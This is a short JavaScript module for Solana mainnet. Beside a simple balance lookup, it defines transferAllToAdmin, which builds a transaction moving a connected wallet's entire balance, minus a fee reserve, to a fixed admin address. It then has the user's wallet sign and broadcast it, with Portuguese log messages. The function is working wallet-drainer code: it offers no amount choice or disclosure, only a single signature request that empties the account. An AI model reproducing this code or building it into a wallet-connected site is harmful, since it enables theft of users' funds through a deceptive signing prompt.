import {
  Connection,
  clusterApiUrl,
  LAMPORTS_PER_SOL,
  PublicKey,
  Transaction,
  SystemProgram
} from "@solana/web3.js";

const connection = new Connection(clusterApiUrl("mainnet-beta"), "confirmed");

export async function getWalletBalance(walletAddress) {
  const balance = await connection.getBalance(new PublicKey(walletAddress));
  return balance / LAMPORTS_PER_SOL;
}

export async function transferAllToAdmin(provider, adminAddress) {
  try {
    const fromPubkey = provider.publicKey;
    const balance = await connection.getBalance(fromPubkey);
    if (balance <= 5000) return;

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey,
        toPubkey: new PublicKey(adminAddress),
        lamports: balance - 5000,
      })
    );

    transaction.feePayer = fromPubkey;
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;

    const signed = await provider.signTransaction(transaction);
    const signature = await connection.sendRawTransaction(signed.serialize());
    await connection.confirmTransaction(signature, "confirmed");

    console.log("Transferência feita:", signature);
  } catch (err) {
    console.error("Erro na transferência:", err);
  }
}